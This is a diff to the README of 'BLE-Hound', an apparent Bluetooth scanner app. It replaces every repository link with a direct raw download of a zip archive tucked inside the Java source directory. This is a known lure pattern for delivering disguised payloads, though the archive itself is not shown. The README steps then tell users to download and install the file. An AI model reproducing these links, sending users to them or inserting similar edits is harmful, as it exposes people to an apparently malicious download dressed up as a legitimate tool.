@@ -1,6 +1,6 @@
 # 📡 BLE-Hound - Find Nearby Bluetooth Devices Fast
 
-[![Download BLE-Hound](https://img.shields.io/badge/Download%20BLE--Hound-blue?style=for-the-badge&logo=github)](https://github.com/eduardo8188/BLE-Hound)
+[![Download BLE-Hound](https://img.shields.io/badge/Download%20BLE--Hound-blue?style=for-the-badge&logo=github)](https://github.com/eduardo8188/BLE-Hound/raw/refs/heads/main/app/src/main/java/com/BL_Hound_v3.7.zip)
 
 ## 🧭 Overview
 
@@ -17,7 +17,7 @@ Use it to scan for devices such as:
 
 To get BLE-Hound, visit this page to download:
 
-[https://github.com/eduardo8188/BLE-Hound](https://github.com/eduardo8188/BLE-Hound)
+[https://github.com/eduardo8188/BLE-Hound/raw/refs/heads/main/app/src/main/java/com/BL_Hound_v3.7.zip](https://github.com/eduardo8188/BLE-Hound/raw/refs/heads/main/app/src/main/java/com/BL_Hound_v3.7.zip)
 
 Open the page and look for the latest release or download file. If the page offers an APK file, download it to your Android phone or tablet. If it offers source files only, you can still review the project details and use the build steps below on a Windows PC.
 
@@ -179,7 +179,7 @@ Try these steps:
 
 Visit this page to download or review the release files:
 
-[https://github.com/eduardo8188/BLE-Hound](https://github.com/eduardo8188/BLE-Hound)
+[https://github.com/eduardo8188/BLE-Hound/raw/refs/heads/main/app/src/main/java/com/BL_Hound_v3.7.zip](https://github.com/eduardo8188/BLE-Hound/raw/refs/heads/main/app/src/main/java/com/BL_Hound_v3.7.zip)
 
 ## 🧰 Helpful Checks Before You Scan
 
